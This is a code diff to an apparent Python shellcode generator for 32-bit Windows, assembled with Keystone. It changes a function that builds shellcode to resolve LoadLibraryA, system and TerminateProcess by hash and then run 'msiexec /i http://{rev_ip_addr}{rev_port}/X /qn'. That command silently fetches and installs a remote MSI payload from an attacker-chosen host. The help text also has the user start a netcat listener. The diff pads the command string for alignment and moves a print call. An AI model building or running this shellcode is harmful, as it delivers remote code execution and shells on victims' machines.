@@ -292,8 +292,12 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     else:
         rev_port = (":" + rev_port)
 
+    # align the string to 4 bytes (pls tell my why it only works with this ... the push string function works fine)
+    msi_exec_str = f"msiexec /i http://{rev_ip_addr}{rev_port}/X /qn"
+    msi_exec_str += " " * (len(msi_exec_str) % 4)
+
     push_instr_msvcrt = push_string("msvcrt.dll")
-    push_instr_msi = push_string(f"msiexec /i http://{rev_ip_addr}{rev_port}/X /qn")
+    push_instr_msi = push_string(msi_exec_str)
     push_instr_terminate_hash = push_function_hash("TerminateProcess")
     push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
     push_instr_system_hash = push_function_hash("system")
@@ -509,7 +513,6 @@ def msg_box(header, text, breakpoint=0):
         "       push 0xffffffff                 ;", # hProcess
         "       call dword ptr [ebp+0x10]       ;" # Call TerminateProcess
     ]
-    print('\n'.join(asm))
     return '\n'.join(asm)
 
 
@@ -530,7 +533,7 @@ def main(args):
         help_msg += f'\t Start listener:\n'
         help_msg += f'\t\t nc -lnvp {args.lport}'
 
-
+    print(shellcode)
     eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
     encoding, count = eng.asm(shellcode)
 
